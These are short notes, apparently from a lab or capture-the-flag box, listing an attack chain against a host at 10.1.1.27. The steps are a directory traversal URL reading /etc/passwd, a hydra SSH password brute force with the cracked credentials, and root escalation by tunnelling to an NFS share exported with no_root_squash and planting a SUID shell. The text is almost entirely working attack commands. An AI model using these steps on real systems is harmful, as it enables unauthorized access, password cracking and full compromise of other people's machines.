@@ -1,0 +1,25 @@
+PHP Power Browse 1.2 - Directory Traversal - https://www.exploit-db.com/exploits/40204
+
+http://10.1.1.27/browse.php?p=source&file=/etc/passwd
+
+hydra -l megan -P common_pass.txt 10.1.1.27 ssh -t 4
+
+user: megan
+password: replicate
+
+privesc:
+
+-bash-4.2$ cat /etc/exports
+/srv/Share 10.1.1.0/24(insecure,rw)
+/srv/Share 127.0.0.1/32(no_root_squash,insecure,rw)
+
+ssh -L 2049:127.0.0.1:2049 megan@10.1.1.27
+
+mount -t nfs -o port=2049 127.0.0.1:/srv/Share /mnt/share
+
+cp suid-shell in /mnt/share
+
+chmod +s suid-shell
+
+in megan shell:
+./suid-shell
